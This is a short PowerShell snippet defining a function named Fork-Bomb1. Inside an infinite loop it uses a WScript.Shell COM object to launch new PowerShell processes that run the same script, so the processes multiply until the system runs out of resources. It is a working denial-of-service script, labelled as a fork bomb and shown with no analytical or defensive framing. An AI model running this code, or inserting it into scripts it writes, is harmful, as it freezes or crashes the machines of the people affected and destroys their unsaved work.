Function Fork-Bomb1 {
While (1) { $WScript = New-Object -com wscript.shell; $WScript.Exec("powershell.exe &" + $PSCommandPath); }
}